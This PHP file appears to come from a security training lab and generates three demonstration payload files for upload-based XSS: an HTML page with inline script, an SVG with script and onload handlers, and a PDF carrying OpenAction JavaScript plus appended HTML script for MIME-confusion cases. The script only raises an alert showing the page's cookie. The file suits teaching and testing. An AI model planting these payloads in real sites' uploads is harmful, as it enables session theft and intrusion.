<?php
/**
 * bafanglab - 模块6d：上传型 XSS —— 示例 payload 下载
 * 版权所有：八方网域-无涯
 *
 * type=html|svg|pdf，分别生成三种可直接上传的示范文件：
 *   html：内联 <script>，浏览器解析即执行；
 *   svg ：<script> + onload，直接访问时执行；
 *   pdf ：带 /OpenAction JavaScript（Adobe Reader 打开会弹窗），
 *         同时在文件尾部夹带 HTML + <script>，模拟 MIME 配置错误时浏览器也会弹窗。
 * 使用 Content-Disposition: attachment 强制下载，避免在本站 DOM 里直接执行。
 */

$type = isset($_GET['type']) ? strtolower((string)$_GET['type']) : '';
$js = "alert('Upload XSS OK\\nCookie: ' + document.cookie);";

$payload = '';
$filename = '';
$mime = 'application/octet-stream';

if ($type === 'html') {
    $filename = 'upload_xss_sample.html';
    $payload = "<!DOCTYPE html>\n<html>\n<head>\n<meta charset=\"UTF-8\">\n<title>Upload XSS - HTML</title>\n</head>\n<body>\n"
        . "<h1>Upload XSS via HTML</h1>\n<p>This HTML file runs inline JavaScript when opened.</p>\n"
        . "<script>" . $js . "</script>\n</body>\n</html>\n";
} elseif ($type === 'svg') {
    $filename = 'upload_xss_sample.svg';
    // SVG 以 image/svg+xml 直接访问时，<script> 与 onload 都会执行
    $payload = '<?xml version="1.0" encoding="UTF-8"?>' . "\n"
        . '<svg xmlns="http://www.w3.org/2000/svg" width="320" height="140" onload="' . htmlspecialchars($js, ENT_QUOTES, 'UTF-8') . '">' . "\n"
        . '  <rect width="320" height="140" fill="#ffffff" stroke="#0b6fd6" stroke-width="2"/>' . "\n"
        . '  <text x="16" y="40" font-family="Arial" font-size="16" fill="#0b6fd6">Upload XSS via SVG</text>' . "\n"
        . '  <script type="text/javascript"><![CDATA[' . $js . ']]></script>' . "\n"
        . '</svg>' . "\n";
} elseif ($type === 'pdf') {
    $filename = 'upload_xss_sample.pdf';

    // 最小可用 PDF：1 Catalog(/OpenAction) → 2 Pages → 3 Page → 4 Action → 5 Font → 6 Contents
    $stream = "BT /F1 14 Tf 20 80 Td (Upload XSS - PDF JavaScript demo) Tj ET\n";
    $objects = array(
        "1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>\nendobj\n",
        "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n",
        "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 360 140] /Resources << /Font << /F1 5 0 R >> >> /Contents 6 0 R >>\nendobj\n",
        '4 0 obj' . "\n" . '<< /Type /Action /S /JavaScript /JS (app.alert\("Upload XSS via PDF JavaScript"\);) >>' . "\nendobj\n",
        "5 0 obj\n<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>\nendobj\n",
        "6 0 obj\n<< /Length " . strlen($stream) . " >>\nstream\n" . $stream . "endstream\nendobj\n",
    );

    // 按 PDF 规范生成正确的 xref 偏移表
    $pdf = "%PDF-1.4\n";
    $offsets = array();
    foreach ($objects as $i => $obj) {
        $offsets[$i + 1] = strlen($pdf);
        $pdf .= $obj;
    }
    $count = count($objects) + 1;
    $xrefPos = strlen($pdf);
    $xref = "xref\n0 " . $count . "\n0000000000 65535 f \n";
    for ($i = 1; $i < $count; $i++) {
        $xref .= sprintf("%010d 00000 n \n", $offsets[$i]);
    }
    $pdf .= $xref . "trailer\n<< /Size " . $count . " /Root 1 0 R >>\nstartxref\n" . $xrefPos . "\n%%EOF\n";

    // 尾部夹带 HTML + JS：当服务器把 .pdf 错误地以 text/html 返回时，浏览器会执行这段脚本
    $payload = $pdf . "\n<h1>Upload XSS via PDF</h1>\n<p>PDF served with the wrong Content-Type becomes an HTML page.</p>\n"
        . "<script>" . $js . "</script>\n";
} else {
    http_response_code(404);
    header('Content-Type: text/plain; charset=UTF-8');
    echo '404 - unknown sample type';
    exit;
}

header('Content-Type: ' . $mime);
header('Content-Disposition: attachment; filename="' . $filename . '"');
header('Content-Length: ' . strlen($payload));
header('Cache-Control: no-store, no-cache, must-revalidate');
header('Pragma: no-cache');
echo $payload;
